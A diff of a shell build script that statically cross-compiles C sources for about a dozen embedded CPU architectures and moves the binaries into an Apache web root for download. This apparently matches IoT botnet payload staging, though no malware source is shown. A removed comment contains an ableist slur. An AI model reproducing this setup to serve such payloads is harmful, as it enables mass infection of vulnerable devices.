@@ -32,18 +32,17 @@ apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
 apt install gcc-sh4-linux-gnu -y
 
-powerpc64-linux-gnu-gcc -static -pthread *.c -o powerpc64  
-mips-linux-gnu-gcc -static -pthread *.c -o mips  
-mipsel-linux-gnu-gcc -static -pthread *.c -o mipsel  
-sparc64-linux-gnu-gcc -static -pthread *.c -o sparc  
-arm-linux-gnueabi-gcc -static -pthread *.c -o arm  
-aarch64-linux-gnu-gcc -static -pthread *.c -o aarch64  
-m68k-linux-gnu-gcc -static -pthread *.c -o m68k  
-i686-linux-gnu-gcc -static -pthread *.c -o i686  
-arm-linux-gnueabihf-gcc -static -pthread *.c -o armhf  
-x86_64-linux-gnu-gcc -static -pthread *.c -o x86_64  
-sh4-linux-gnu-gcc -static -pthread *.c -o sh4  
-# how retarded i am to forget -static earlier lmao (^)
+powerpc64-linux-gnu-gcc -static -pthread -DARCH_powerpc64 *.c -o powerpc64  
+mips-linux-gnu-gcc -static -pthread -DARCH_mips *.c -o mips  
+mipsel-linux-gnu-gcc -static -pthread -DARCH_mipsel *.c -o mipsel  
+sparc64-linux-gnu-gcc -static -pthread -DARCH_sparc *.c -o sparc  
+arm-linux-gnueabi-gcc -static -pthread -DARCH_arm *.c -o arm  
+aarch64-linux-gnu-gcc -static -pthread -DARCH_aarch64 *.c -o aarch64  
+m68k-linux-gnu-gcc -static -pthread -DARCH_m68k *.c -o m68k  
+i686-linux-gnu-gcc -static -pthread -DARCH_i686 *.c -o i686  
+arm-linux-gnueabihf-gcc -static -pthread -DARCH_arm *.c -o armhf  
+x86_64-linux-gnu-gcc -static -pthread -DARCH_x86_64 *.c -o x86_64  
+sh4-linux-gnu-gcc -static -pthread -DARCH_sh4 *.c -o sh4  
 
 #move binaries to apache2 dir
 mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html
